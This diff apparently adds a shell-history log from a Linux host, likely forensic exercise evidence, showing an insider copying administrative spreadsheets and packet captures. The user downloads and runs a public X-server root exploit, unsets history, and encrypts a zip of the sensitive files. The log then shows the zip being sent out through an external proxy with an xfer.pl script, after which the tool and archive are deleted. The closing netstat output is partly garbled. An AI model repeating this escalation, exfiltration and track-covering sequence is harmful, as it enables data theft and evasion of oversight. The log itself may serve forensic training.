@@ -1,0 +1,117 @@
+(Dec 9 3:02)
+uname -a
+who
+ll -h
+mkdir temp
+ll -h
+chmod o-xrw temp/
+ll -h
+cd temp/
+cp /mnt/hgfs/Admin_share/*.xls .
+cp /mnt/hgfs/Admin_share/*.pcap .
+exit
+
+uname -a
+id
+exit
+
+X -v
+X -V
+X -version
+cd temp
+wget http://metasploit.com/users/hdm/tools/xmodulepath.tgz
+tar -zpxvf xmodulepath.tgz
+cd xmodulepath
+ll
+unset HISTORY
+./root.sh
+exit
+
+pwd
+cd ..
+cp /mnt/hgfs/Admin_share/intranet.vsd .
+ll
+ls -lh
+exit
+
+(Dec 9 6:24)
+gedit file:///home/stevev/temp/ELF exploit.sh
+
+(Dec 16 22:28)
+ls /mnt/hgfs/Admin_share/
+zip archive.zip /mnt/hgfs/Admin_share/acct_prem.xls /mnt/hgfs/Admin_share/domain.xls /mnt/hgfs/Admin_share/ftp.pcap
+zipcloak archive.zip
+[stevev@goldfinger ~]$ cp /mnt/hgfs/software/xfer.pl .
+[stevev@goldfinger ~]$ cp /mnt/hgfs/zip /mnt/hgfs/Admin_share/
+[stevev@goldfinger ~]$ ll -h
+total 36K
+-rw-r--r-- 1 stevev stevev  21K Dec 16 22:28 archive.zip
+drwxr-xr-x 2 stevev stevev 4.0K Dec  8 03:24 Desktop
+drwxrwx--- 3 stevev stevev 4.0K Dec  9 03:02 temp
+-rwxrw-r-- 1 stevev stevev 3.2K Dec 16 22:28 xfer.pl
+[stevev@goldfinger ~]$ export http_proxy="http://219.93.175.67:80"
+
+[stevev@goldfinger ~]$ ./xfer.pl archive.zip 
+Preparing archive.zip for transmission ......
+
+Sending now. Patience please ....
+
+Data transmission complete. Exiting.
+
+[stevev@goldfinger ~]$ unset http_proxy
+[stevev@goldfinger ~]$ rm xfer.pl 
+[stevev@goldfinger ~]$ dir
+archive.zip  Desktop  temp
+[stevev@goldfinger ~]$ rm archive.zip 
+[stevev@goldfinger ~]$
+
+
+[stevev@goldfinger ~]$ netstat -tupan
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name   
+tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 192.168.151.130:58539       86.64.162.35:80             TIME_WAIT   -                   
+tcp        0      0 192.168.151.130:42137       219.93.175.67:80            ESTABLISHED 3935/wget           
+udp        0      0 0.0.0.0:68                  0.0.0.0:*                               -                   
+[stevev@goldfinger ~]$
+
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name   
+tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 192.168.151.130:58539       86.64.162.35:80             TIME_WAIT   -                   
+tcp        0      0 192.168.151.130:42137       219.93.175.67:80            ESTABLISHED 3935/wget           
+udp        0      0 0.0.0.0:68                  0.0.0.0:*                               -                   
+						198.105.194.12:80           ESTABLISHED 3048/firefox-bin    
+tcp        0      0 192.168.151.130:37429       198.105.194.12:80           ESTABLISHED 3048/firefox-bin    
+udp        0      0 0.0.0.0:68                  0.0.0.0:*                               -                   
+						198.105.192.146:80          ESTABLISHED 3048/firefox-bin    
+tcp        0      0 192.168.151.130:55290       209.170.113.63:80           TIME_WAIT   -                   
+udp        0      0 0.0.0.0:68                  0.0.0.0:*                               -                   
+						8.12.96.8:80                ESTABLISHED 3048/firefox-bin    
+tcp        0      0 192.168.151.130
+
+[stevev@goldfinger ~]$ hown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name   
+tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 192.168.151.130:33463       64.154.81.197:80            ESTABLISHED 3048/firefox-bin    
+tcp        0      0 192.168.151.130:48700       219.93.175.67:80            ESTABLISHED 3551/wget           
+tcp        0      0 192.168.151.130:39763       12.187.16.75:80             ESTABLISHED 3048/firefox-bin    
+tcp        0      0 192.168.151.130:37430       198.105.194.12:80           ESTABLISHED 3048/firefox-bin    
+tcp        0      0 192.168.151.130:37429       198.105.194.12:80           ESTABLISHED 3048/firefox-bin    
+udp        0      0 0.0.0.0:68                  0.0.0.0:*
+
+[stevev@goldfinger ~]$ netstat -tupan
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name   
+tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 192.168.151.130:48700       219.93.175.67:80            ESTABLISHED 3551/wget           
+tcp        0      0 192.168.151.130:39763       12.187.16.75:80             TIME_WAIT   -                   
+udp        0      0 0.0.0.0:68                  0.0.0.0:*
+
